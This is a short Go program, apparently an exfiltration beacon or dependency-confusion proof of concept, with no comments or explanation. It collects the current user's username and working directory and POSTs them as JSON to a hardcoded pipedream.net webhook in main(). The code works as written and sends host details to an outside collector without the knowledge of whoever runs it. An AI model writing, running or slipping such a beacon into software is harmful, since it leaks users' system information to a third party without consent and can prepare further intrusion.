package main

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"os/user"
)

type Payload struct {
	Whoami   string `json:"whoami"`
	Username string `json:"username"`
	CWD      string `json:"cwd"`
}

func collectData() (*Payload, error) {
	u, err := user.Current()
	if err != nil {
		return nil, err
	}

	cwd, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return &Payload{
		Whoami:   u.Username,
		Username: u.Username,
		CWD:      cwd,
	}, nil
}

func Send(endpoint string) error {
	data, err := collectData()
	if err != nil {
		return err
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", endpoint, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	_, err = client.Do(req)
	return err
}

func main() {
	err := Send("https://eoxzttabeek4bna.m.pipedream.net")
	if err != nil {
		log.Fatal(err)
	}
}
